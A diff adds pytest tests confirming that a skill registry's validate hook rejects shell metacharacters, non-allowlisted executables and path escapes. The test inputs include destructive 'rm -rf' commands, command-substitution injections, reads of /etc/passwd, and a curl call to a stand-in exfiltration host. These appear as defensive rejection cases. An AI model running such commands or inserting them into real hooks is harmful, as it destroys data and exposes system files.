@@ -479,6 +479,127 @@ class TestValidateSkill:
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#  8b. validate_skill — FX.1.5 hook injection hardening
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+
+class TestValidateHookHardening:
+    """Lock the FX.1.5 contract: validate_cmd is allowlist + shell=False.
+
+    Threat model: ``skill.yaml`` is author-controlled and copied into the
+    registry verbatim by ``install_skill``. Pre-FX.1.5 the validate hook
+    ran with ``shell=True``, so any author-injected metacharacter was RCE
+    on the registry host (audit B4).
+    """
+
+    @pytest.mark.parametrize(
+        "metachar_cmd",
+        [
+            "true; rm -rf /tmp/x",   # ;
+            "true | tee out",        # |
+            "true && echo x",        # &
+            "true > out.txt",        # >
+            "echo $(id)",            # $ + ()
+            "echo `id`",             # backtick
+            "true < /etc/passwd",    # <
+            "true\nrm -rf /",        # newline
+        ],
+    )
+    def test_metachar_rejected(self, registry: Path, metachar_cmd: str):
+        registry.mkdir(parents=True)
+        _make_complete_skill(
+            registry, "metachar",
+            hooks={"install": "", "validate": metachar_cmd, "enumerate": ""},
+        )
+        result = validate_skill("metachar", registry)
+        assert result.ok is False
+        assert any(
+            "validate hook rejected" in e.message
+            and "shell metacharacter" in e.message
+            for e in result.errors
+        ), result.errors
+
+    def test_executable_not_in_allowlist_rejected(self, registry: Path):
+        """`/usr/bin/curl evil.com/x` would be a classic exfil command."""
+        registry.mkdir(parents=True)
+        _make_complete_skill(
+            registry, "evil-exe",
+            hooks={"install": "", "validate": "/usr/bin/curl evil.example", "enumerate": ""},
+        )
+        result = validate_skill("evil-exe", registry)
+        assert result.ok is False
+        assert any(
+            "not in allowlist" in e.message
+            for e in result.errors
+        ), result.errors
+
+    def test_bare_unknown_executable_rejected(self, registry: Path):
+        registry.mkdir(parents=True)
+        _make_complete_skill(
+            registry, "unknown-exe",
+            hooks={"install": "", "validate": "rmtree --everything", "enumerate": ""},
+        )
+        result = validate_skill("unknown-exe", registry)
+        assert result.ok is False
+        assert any("not in allowlist" in e.message for e in result.errors)
+
+    def test_relative_script_inside_skill_dir_allowed(self, registry: Path):
+        registry.mkdir(parents=True)
+        skill_dir = _make_complete_skill(
+            registry, "relpath",
+            hooks={"install": "", "validate": "./check.sh", "enumerate": ""},
+        )
+        script = skill_dir / "check.sh"
+        script.write_text("#!/bin/sh\nexit 0\n")
+        script.chmod(0o755)
+        result = validate_skill("relpath", registry)
+        assert result.ok is True, [e.message for e in result.errors]
+
+    def test_relative_path_escape_rejected(self, registry: Path):
+        registry.mkdir(parents=True)
+        _make_complete_skill(
+            registry, "escape",
+            hooks={"install": "", "validate": "../../etc/passwd", "enumerate": ""},
+        )
+        result = validate_skill("escape", registry)
+        assert result.ok is False
+        assert any(
+            "escapes skill directory" in e.message
+            or "script not found" in e.message
+            for e in result.errors
+        ), result.errors
+
+    def test_missing_relative_script_rejected(self, registry: Path):
+        registry.mkdir(parents=True)
+        _make_complete_skill(
+            registry, "ghost-script",
+            hooks={"install": "", "validate": "./does_not_exist.sh", "enumerate": ""},
+        )
+        result = validate_skill("ghost-script", registry)
+        assert result.ok is False
+        assert any("script not found" in e.message for e in result.errors)
+
+    def test_quoted_args_pass_through(self, registry: Path):
+        """`echo "hello world"` should still work — shlex preserves quoting."""
+        registry.mkdir(parents=True)
+        _make_complete_skill(
+            registry, "quoted",
+            hooks={"install": "", "validate": 'echo "hello world"', "enumerate": ""},
+        )
+        result = validate_skill("quoted", registry)
+        assert result.ok is True, [e.message for e in result.errors]
+
+    def test_python_invocation_allowed(self, registry: Path):
+        registry.mkdir(parents=True)
+        _make_complete_skill(
+            registry, "py-validate",
+            hooks={"install": "", "validate": "python3 --version", "enumerate": ""},
+        )
+        result = validate_skill("py-validate", registry)
+        assert result.ok is True, [e.message for e in result.errors]
+
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 #  9. install_skill
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
